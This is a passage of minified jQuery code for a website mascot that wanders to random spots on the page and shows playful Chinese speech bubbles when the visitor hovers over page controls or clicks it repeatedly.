setInterval(RefreshPage,10*1000);CloseTips();});;function rand_move(msg){var i1=Math.floor(Math.random()*window.innerWidth);if(i1>(window.innerWidth-robot.width()))
i1-=robot.width();else if(i1<robot.width())
i1+=robot.width();var i2=Math.floor(Math.random()*window.innerHeight);if(i2>(window.innerHeight-robot.height()))
i2-=robot.height();else if(i2<robot.height())
i2+=robot.height();robot.animate({left:i1,top:i2},{duration:2000,complete:talk(msg)})}
function talk(a,b){if(b==null)b=10000;dom_talk.hide().stop();dom_talk.html(a);dom_talk.fadeIn();dom_talk.fadeTo("1",1);dom_talk.fadeOut(b)}
function reply()
{$('a').click(function(){talk("正在为你努力加载")});$('#next_page').mouseover(function(){talk('要翻到下一页吗?')});$(".fa-calendar").mouseover(function(){talk('可以按照日期跳转哦')});$(".bigcursor").mouseover(function(){talk('点击查看大图哦')});$(".leftcursor").mouseover(function(){talk('查看上一张图')});$(".rightcursor").mouseover(function(){talk('查看下一张图')});$(".donate").mouseover(function(){talk('你要请我喝咖啡吗？')});}
var stat_click=0;function click_reply()
{if(!ismove){stat_click++;if(stat_click>4){var msgs=["你有完没完呀？","你已经摸我"+stat_click+"次了","非礼呀！救命！OH，My ladygaga"];var i=Math.floor(Math.random()*msgs.length)}else{var msgs=["筋斗云！~我飞！","我跑呀跑呀跑！~~","别摸我，大男人，有什么好摸的！","惹不起你，我还躲不起你么？","不要摸我了，我会告诉老婆来打你的！","干嘛动我呀！小心我咬你！"];var i=Math.floor(Math.random()*msgs.length)}
rand_move(msgs[i]);}else{ismove=false}}




